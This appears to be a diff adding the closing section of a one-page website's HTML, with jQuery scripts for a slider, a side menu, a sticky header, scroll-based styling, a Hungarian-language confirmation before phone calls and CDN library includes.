+            soloArrowRightVOffset: 0,
+
+            touchenabled: "on",
+
+            stopAtSlide: -1,
+
+            stopAfterLoops: -1,
+
+            hideCaptionAtLimit: 0,
+
+            hideAllCaptionAtLilmit: 0,
+
+            hideSliderAtLimit: 0,
+
+            dottedOverlay: "none",
+
+            forceFullWidth: "off",
+
+            shadow: 0
+
+        });
+
+});				
+
+</script> 
+<script>
+
+	var menuRight = document.getElementById( 'cbp-spmenu-s2' ),
+
+		body = document.body;
+
+		showRight.onclick = function() {
+
+		classie.toggle( this, 'active' );
+
+		classie.toggle( menuRight, 'cbp-spmenu-open' );
+
+		disableOther( 'showRight' );
+
+	};
+
+			
+
+	function disableOther( button ) {
+
+		if( button !== 'showRight' ) {
+
+			classie.toggle( showRight, 'disabled' );
+
+		}
+
+	}
+
+</script> 
+<script src="js/portfolio.js"></script> 
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-easing/1.3/jquery.easing.min.js"></script> 
+<script src="js/menu.js"></script> 
+<script src="js/jquery.nav.js"></script> 
+<script src="js/classie.js"></script> 
+<script src="js/cbpAnimatedHeader.js"></script> 
+<script src="js/jquery.sticky.js"></script> 
+
+
+<script>
+
+
+$("body").on('click', 'a[href^="tel:"]', function(e){
+    e.preventDefault(); // Megakadályozza az azonnali hívást
+    
+    var phoneNumber = $(this).attr("href").replace("tel:", ""); // Telefonszám kinyerése
+    var confirmCall = confirm("Biztosan fel szeretné hívni ezt a számot? " + phoneNumber);
+
+    if (confirmCall) {
+
+        // Ha megerősíti, akkor végrehajtja a hívást
+        window.location.href = $(this).attr("href");
+    }
+});
+
+
+	$(document).ready(function(){
+
+		$(".header-onepage").sticky({topSpacing:0});
+
+	});
+
+</script> 
+<script>
+
+// Highlight the top nav as scrolling occurs
+
+$('body').scrollspy({
+
+    target: '.navbar-top',
+
+    offset: 120
+
+})
+
+</script> 
+<script>
+
+// Scroll Plugin
+
+$(window).scroll(function() {    
+
+	var scroll = $(window).scrollTop();
+
+	if (scroll >= 600) {
+
+		$(".header-onepage .navbar-nav li").css({'padding':'20px 5px 0 5px'});
+
+			} else {
+
+		$(".header-onepage .navbar-nav li").css({'padding':'30px 5px 30px 5px'});
+
+	}
+
+});
+
+
+
+$(window).scroll(function() {    
+
+	var scroll = $(window).scrollTop();
+
+	if (scroll >= 600) {
+
+		$(".header-onepage .navbar-brand").css({'margin-top':'-3px'});
+
+			} else {
+
+		$(".header-onepage .navbar-brand").css({'margin-top':'10px'});
+
+	}
+
+});
+
+
+
+$(window).scroll(function() {    
+
+	var scroll = $(window).scrollTop();
+
+	if (scroll >= 600) {
+
+		$(".header-onepage .uh-search").css({'margin-top':'-10px'});
+
+			} else {
+
+		$(".header-onepage .uh-search").css({'margin-top':'0px'});
+
+	}
+
+});
+
+
+
+$(window).scroll(function() {    
+
+	var scroll = $(window).scrollTop();
+
+	if (scroll >= 600) {
+
+		$(".header-onepage .uh-search form").css({'margin-top':'-4px'});
+
+			} else {
+
+		$(".header-onepage .uh-search form").css({'margin-top':'0px'});
+
+	}
+
+});
+
+</script> 
+<script src="js/jquery-sliding-menu.js"></script> 
+<script src="js/mob-menu.js"></script> 
+<script src="php/twitter/jquery.tweet.js"></script> 
+<script src="js/unique.js"></script> 
+<script src="js/retina.js"></script> 
+<script src="js/jquery.easing/jquery.easing.js"></script> 
+<script src="js/jquery-cookie/jquery-cookie.js"></script> 
+<script>
+
+
+
+$('.nav a').on('click', function(){
+
+    $(".btn-navbar").click(); //bootstrap 2.x
+
+    $(".navbar-toggle").click() //bootstrap 3.x by Richard
+
+});
+
+
+
+</script>
+
+		<script type="text/javascript" src="//cdn.jsdelivr.net/cookie-bar/1/cookiebar-latest.min.js"></script>
+
+
+
+
+</body>
+</html>
